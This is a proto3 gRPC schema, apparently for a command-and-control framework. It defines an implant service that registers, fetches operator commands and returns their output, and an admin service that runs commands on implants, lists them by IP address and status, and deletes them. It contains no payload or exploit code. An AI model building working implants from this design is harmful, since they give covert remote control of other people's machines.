syntax = "proto3";
option go_package = "./;grpcapi";
package grpcapi;

service Implant {
    rpc FetchCommand (Empty) returns (Command);
    rpc SendOutput (Command) returns (Empty);
    rpc RegisterNewImplant (Empty) returns (RegisterResponse);
}

service Admin {
    rpc RunCommand (Command) returns (Command);
    rpc ListRegisteredImplants (Empty) returns (ImplantsList);
    rpc DeleteImplant(DeleteRequest) returns (Empty);
}

message DeleteRequest {
    string id = 1;
}

message Command {
    string implant_id = 1;
    string in = 2;
    string out = 3;
    bool is_kill = 4;
}

message Empty {}

message ImplantData {
    string id = 1;
    string ip_address = 2;
    string last_seen = 3;
    string status = 4;
}

message ImplantsList {
    repeated ImplantData implants = 1;
}

message RegisterResponse {
    string id = 1;
}